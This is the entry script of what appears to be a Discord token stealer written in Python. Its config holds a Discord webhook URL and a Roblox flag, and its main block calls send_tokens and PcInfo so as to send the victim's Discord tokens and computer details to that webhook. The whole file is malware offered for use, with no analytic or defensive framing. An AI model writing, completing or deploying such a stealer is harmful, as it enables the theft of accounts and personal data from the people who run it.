
__CONFIG__ = {
    "webhook": "https://discord.com/api/webhooks/1361570999354527826/Z7RoX24SRG5Z7uaVFaN4I9XxIlqGpnG0XZxUbRzoIs3XcFJYuzvKhYGkpwD-ipJir7rT",
    "roblox": True, 
}

from component.x3 import Made_By_Omar
from component.info import PcInfo




if __name__ == "__main__":
    discord = Made_By_Omar()
    discord.send_tokens(__CONFIG__["webhook"])
    pc_info = PcInfo(__CONFIG__["webhook"])






